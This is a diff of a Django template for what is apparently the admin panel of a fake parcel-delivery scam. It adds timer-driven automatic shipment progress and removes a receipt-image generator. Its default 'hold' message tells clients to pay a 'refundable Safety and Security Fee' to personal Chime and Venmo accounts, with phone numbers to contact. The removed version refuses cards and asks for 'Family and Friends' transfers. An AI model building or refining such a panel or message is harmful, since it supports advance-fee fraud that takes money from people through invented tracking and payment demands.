@@ -6,6 +6,7 @@
         <div>
             <p class="eyebrow">Admin Backend</p>
             <h1>Shipment Control Center</h1>
+            <p class="dashboard-subcopy">Monitor shipment flow, apply holds, release payments, and update progress in real time.</p>
         </div>
         <form method="post" action="{% url 'backend_logout' %}">
             {% csrf_token %}
@@ -13,77 +14,29 @@
         </form>
     </section>
 
-    <section class="container receipt-generator-panel reveal">
-        <article class="card">
-            <h2>Shipment Receipt Generator</h2>
-            <p class="receipt-generator-note">
-                Fill the receipt fields and click generate. The details are saved for future edits and the completed
-                receipt image downloads instantly.
-            </p>
-            <form method="post" action="{% url 'generate_manual_receipt' %}" class="stack-form">
-                {% csrf_token %}
-                <div class="receipt-generator-grid">
-                    {% for field in receipt_form %}
-                        <div class="field-group">
-                            <label for="{{ field.id_for_label }}">{{ field.label }}</label>
-                            {{ field }}
-                            {% if field.errors %}
-                                <small class="form-error">{{ field.errors|striptags }}</small>
-                            {% endif %}
-                        </div>
-                    {% endfor %}
-                </div>
-                <button type="submit" class="btn btn-primary">Generate Receipt Image</button>
-            </form>
-        </article>
-    </section>
-
-    <section class="container receipt-history-panel reveal delay-1">
-        <article class="card">
-            <h2>Generated Shipment Receipts</h2>
-            <div class="table-wrap">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>Recipient</th>
-                            <th>Date</th>
-                            <th>Charges</th>
-                            <th>Updated</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        {% for receipt in recent_receipts %}
-                            <tr>
-                                <td>#{{ receipt.id }}</td>
-                                <td>
-                                    <strong>{{ receipt.recipient_name }}</strong><br />
-                                    <small>{{ receipt.recipient_number }}</small>
-                                </td>
-                                <td>{{ receipt.schedule_delivery_date|date:"Y-m-d" }}</td>
-                                <td>
-                                    <small>Subtotal: ${{ receipt.shipping_subtotal }}</small><br />
-                                    <small>Custom: ${{ receipt.custom_charges }}</small><br />
-                                    <strong>Total: ${{ receipt.total }}</strong>
-                                </td>
-                                <td>{{ receipt.updated_at|date:"Y-m-d H:i" }}</td>
-                                <td>
-                                    <div class="quick-row-actions">
-                                        <a href="{% url 'edit_manual_receipt' receipt.id %}" class="btn btn-sm btn-outline">Edit</a>
-                                        <a href="{% url 'download_manual_receipt' receipt.id %}" class="btn btn-sm btn-secondary">Download</a>
-                                    </div>
-                                </td>
-                            </tr>
-                        {% empty %}
-                            <tr>
-                                <td colspan="6">No generated receipts yet.</td>
-                            </tr>
-                        {% endfor %}
-                    </tbody>
-                </table>
-            </div>
-        </article>
+    <section class="container analytics-panel reveal delay-1">
+        <div class="analytics-cards">
+            <article>
+                <p>Total Orders</p>
+                <h3>{{ total_orders }}</h3>
+            </article>
+            <article>
+                <p>Delivered</p>
+                <h3>{{ delivered_orders }}</h3>
+            </article>
+            <article>
+                <p>In Transit</p>
+                <h3>{{ transit_orders }}</h3>
+            </article>
+            <article>
+                <p>On Hold</p>
+                <h3>{{ hold_orders }}</h3>
+            </article>
+            <article>
+                <p>Created Today</p>
+                <h3>{{ today_orders }}</h3>
+            </article>
+        </div>
     </section>
 
     <section class="container dashboard-toolbar reveal delay-1">
@@ -93,9 +46,15 @@
                 name="tracking"
                 value="{{ search_query }}"
                 class="input-field"
-                placeholder="Search order by tracking number"
+                placeholder="Search by tracking number"
             />
-            <button type="submit" class="btn btn-primary">Search</button>
+            <select name="status" class="input-field">
+                <option value="">All statuses</option>
+                {% for value, label in status_choices %}
+                    <option value="{{ value }}" {% if status_filter == value %}selected{% endif %}>{{ label }}</option>
+                {% endfor %}
+            </select>
+            <button type="submit" class="btn btn-primary">Apply Filter</button>
             <a href="{% url 'dashboard' %}" class="btn btn-outline">Reset</a>
         </form>
     </section>
@@ -119,7 +78,7 @@
         </article>
 
         <article class="card wide reveal delay-1">
-            <h2>All Shipment Orders</h2>
+            <h2>Shipment Orders</h2>
             <div class="table-wrap">
                 <table>
                     <thead>
@@ -142,7 +101,19 @@
                                 </td>
                                 <td>
                                     <small>From:</small> {{ order.from_address|truncatechars:50 }}<br />
-                                    <small>To:</small> {{ order.to_address|truncatechars:50 }}
+                                    <small>To:</small> {{ order.to_address|truncatechars:50 }}<br />
+                                    <small>Current:</small> {{ order.current_location|default:"-" }}
+                                    {% with route_points=order.get_route_points %}
+                                        {% if route_points %}
+                                            <div class="route-stops">
+                                                {% for stop in route_points %}
+                                                    <span class="route-stop {% if forloop.counter0 < order.current_waypoint_index %}passed{% elif forloop.counter0 == order.current_waypoint_index %}current{% else %}pending{% endif %}">
+                                                        {{ stop|truncatechars:28 }}
+                                                    </span>
+                                                {% endfor %}
+                                            </div>
+                                        {% endif %}
+                                    {% endwith %}
                                 </td>
                                 <td>
                                     <strong>{{ order.item_name }}</strong><br />
@@ -196,6 +167,32 @@
                                         <button type="submit" class="btn btn-sm">Set Progress</button>
                                     </form>
 
+                                    <form method="post" action="{% url 'update_auto_settings' order.id %}" class="inline-form auto-settings-form">
+                                        {% csrf_token %}
+                                        <label class="auto-toggle">
+                                            <input type="checkbox" name="auto_update_enabled" class="checkbox-field checkbox-field-inline" {% if order.auto_update_enabled %}checked{% endif %} />
+                                            Auto
+                                        </label>
+                                        <input
+                                            type="number"
+                                            name="auto_update_percent_step"
+                                            class="input-field slim"
+                                            min="1"
+                                            max="100"
+                                            value="{{ order.auto_update_percent_step }}"
+                                            title="Progress increase per interval"
+                                        />
+                                        <input
+                                            type="number"
+                                            name="auto_update_interval_minutes"
+                                            class="input-field slim"
+                                            min="1"
+                                            value="{{ order.auto_update_interval_minutes }}"
+                                            title="Interval in minutes"
+                                        />
+                                        <button type="submit" class="btn btn-sm btn-secondary">Save Auto</button>
+                                    </form>
+
                                     <form method="post" action="{% url 'update_status' order.id %}" class="inline-form">
                                         {% csrf_token %}
                                         <select name="status" class="input-field slim">
@@ -212,19 +209,17 @@
                                         {% csrf_token %}
                                         <input type="number" name="hold_amount" step="0.01" placeholder="Charge" class="input-field slim" required />
                                         <input type="text" name="hold_reason" placeholder="Hold reason" class="input-field slim" required />
-                                        <textarea name="hold_message" class="input-field slim" rows="6" placeholder="Message shown to client">Your order is currently on hold due to applicable charges (Safety and Security Fee).
-To proceed with processing, kindly complete the required payment below. Please note that this fee is fully refundable upon delivery!!.
+                                        <textarea name="hold_message" class="input-field slim" rows="5" placeholder="Message shown to client">Your order is currently on hold due to applicable charges (Safety and Security Fee).
+To proceed with processing, kindly complete the required payment below. Please note that this fee is fully refundable.
 
-Accepted payment options:  
-- Chime: $Hernan-Aguilar or request from customer
-- Venmo: @HUGO-HORTA-1 (Last 4 digits: 6811) * Family and Friends opinion only is available or request from Customer 
-- Zelle: Please request details from our delivery agent  
-- Apple Pay: Please request details from our delivery agent  
+Accepted payment options:
+- Chime: $Hernan-Aguilar
+- Venmo: @HUGO-HORTA-1 (Last 4 digits: 6811)
+- Zelle: Request details from our delivery agent
+- Apple Pay: Request details from our delivery agent
 
-We do not accept credit or debit card payments.
-
-For assistance, please contact our delivery agents via chat at:  
-+1 (559) 889-6546  
+For assistance:
++1 (559) 889-6546
 +1 (602) 654-5189</textarea>
                                         <button type="submit" class="btn btn-sm btn-warn">Withhold</button>
                                     </form>
@@ -236,8 +231,8 @@ For assistance, please contact our delivery agents via chat at:
                                 </td>
                             </tr>
                         {% empty %}
-                            <tr>Your 
-                                <td colspan="7">No shipments match your query yet. Create a new order or reset search.</td>
+                            <tr>
+                                <td colspan="7">No shipments match your filter yet. Create a new order or reset search.</td>
                             </tr>
                         {% endfor %}
                     </tbody>
@@ -247,29 +242,6 @@ For assistance, please contact our delivery agents via chat at:
     </section>
 
     <section class="container analytics-panel reveal delay-2">
-        <h2>Backend Analytics</h2>
-        <div class="analytics-cards">
-            <article>
-                <p>Total Orders</p>
-                <h3>{{ total_orders }}</h3>
-            </article>
-            <article>
-                <p>Delivered</p>
-                <h3>{{ delivered_orders }}</h3>
-            </article>
-            <article>
-                <p>In Transit</p>
-                <h3>{{ transit_orders }}</h3>
-            </article>
-            <article>
-                <p>On Hold</p>
-                <h3>{{ hold_orders }}</h3>
-            </article>
-            <article>
-                <p>Created Today</p>
-                <h3>{{ today_orders }}</h3>
-            </article>
-        </div>
         <div class="analytics-chart-card">
             <h3>Orders Created (Last 7 Days)</h3>
             <canvas id="ordersTrendChart" height="100"></canvas>
@@ -284,14 +256,18 @@ For assistance, please contact our delivery agents via chat at:
         const chartNode = document.getElementById("ordersTrendChart");
         if (chartNode) {
             new Chart(chartNode, {
-                type: "bar",
+                type: "line",
                 data: {
                     labels: {{ chart_labels|safe }},
                     datasets: [{
                         label: "Orders",
                         data: {{ chart_values|safe }},
-                        backgroundColor: "#2f95cb",
-                        borderRadius: 8
+                        tension: 0.35,
+                        fill: true,
+                        borderColor: "#0f5b84",
+                        backgroundColor: "rgba(15, 91, 132, 0.16)",
+                        pointRadius: 4,
+                        pointBackgroundColor: "#f28f2d"
                     }]
                 },
                 options: {
